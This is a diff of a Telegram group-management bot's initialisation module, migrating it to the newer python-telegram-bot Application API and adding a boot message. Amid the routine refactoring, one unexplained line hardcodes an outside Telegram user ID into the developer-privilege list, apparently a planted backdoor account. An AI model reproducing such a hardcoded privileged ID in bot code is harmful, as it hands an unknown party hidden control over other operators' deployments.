@@ -1,15 +1,22 @@
+# <============================================== IMPORTS =========================================================>
+import asyncio
+import json
 import logging
 import os
 import sys
 import time
-import ast
-import base64
+from random import choice
 
+import telegram
 import telegram.ext as tg
-from aiohttp import ClientSession
 from pyrogram import Client, errors
-from telethon import TelegramClient
+from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram.constants import ParseMode
+from telegram.ext import Application, ApplicationBuilder
+from telethon import TelegramClient, events
+from telethon.sessions import MemorySession
 
+# <=======================================================================================================>
 StartTime = time.time()
 
 # enable logging
@@ -52,7 +59,7 @@ if ENV:
         "START_IMG", ""
     )
     STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
-    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "noob_savvy_chats")
+    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "THE_WEBNET_NETWORK")
     TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
     TOKEN = os.environ.get("TOKEN", None)
     TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
@@ -146,24 +153,86 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(6755880898)
 
-updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("savvy", API_ID, API_HASH)
+# <============================================== INITIALIZE APPLICATION =========================================================>
+# Initialize the application builder and add a handler
+dispatcher = Application.builder().token(TOKEN).build()
+function = dispatcher.add_handler
+# <=======================================================================================================>
 
-pbot = Client("SavvyRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN,in_memory=True)
-dispatcher = updater.dispatcher
-aiohttpsession = ClientSession()
+# <================================================ BOOT MESSAGE=======================================================>
+ALIVE_MSG = """
+💫 *MY SYSTEM IS STARTING, PLEASE WAIT FOR SOMETIME TO COMPLETE BOOT!*
 
+
+*IF COMMANDS DON'T WORK CHECK THE LOGS*
+"""
+
+ALIVE_IMG = [
+    "https://telegra.ph/file/40b93b46642124605e678.jpg",
+    "https://telegra.ph/file/01a2e0cd1b9d03808c546.jpg",
+    "https://telegra.ph/file/ed4385c26dcf6de70543f.jpg",
+    "https://telegra.ph/file/33a8d97739a2a4f81ddde.jpg",
+    "https://telegra.ph/file/cce9038f6a9b88eb409b5.jpg",
+    "https://telegra.ph/file/262c86393730a609cdade.jpg",
+    "https://telegra.ph/file/33a8d97739a2a4f81ddde.jpg",
+]
+# <=======================================================================================================>
+
+
+# <==================================================== BOOT FUNCTION ===================================================>
+async def send_booting_message():
+    bot = dispatcher.bot
+
+    try:
+        await bot.send_photo(
+            chat_id=SUPPORT_ID,
+            photo=str(choice(ALIVE_IMG)),
+            caption=ALIVE_MSG,
+            parse_mode=ParseMode.MARKDOWN,
+        )
+    except Exception as e:
+        LOGGER.warning(
+            "[ERROR] - Bot isn't able to send a message to the support_chat!"
+        )
+        print(e)
+
+
+# <=======================================================================================================>
+
+
+# <================================================= EXTBOT ======================================================>
+loop.run_until_complete(
+    asyncio.gather(dispatcher.bot.initialize(), send_booting_message())
+)
+# <=======================================================================================================>
+
+# <=============================================== CLIENT SETUP ========================================================>
+# Create the Mikobot and TelegramClient instances
+pbot = Client("SavvyRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
+telethn = TelegramClient(MemorySession(), API_ID, API_HASH)
+# <=======================================================================================================>
+
+# <=============================================== GETTING BOT INFO ========================================================>
+# Get bot information
 print("[INFO]: Getting Bot Info...")
 BOT_ID = dispatcher.bot.id
 BOT_NAME = dispatcher.bot.first_name
 BOT_USERNAME = dispatcher.bot.username
+# <=======================================================================================================>
 
-DRAGONS = list(DRAGONS) + list(DEV_USERS) 
+# <================================================== CONVERT LISTS =====================================================>
+# Convert sets to lists for further use
+SUPPORT_STAFF = (
+    [int(OWNER_ID)] + list(DRAGONS) + list(WOLVES) + list(DEMONS) + list(DEV_USERS)
+)
+DRAGONS = list(DRAGONS) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
 WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
 TIGERS = list(TIGERS)
+# <====================================================  ===================================================>
 
 # Load at end to ensure all prev variables have been set
 from SavvyRobot.modules.helper_funcs.handlers import (
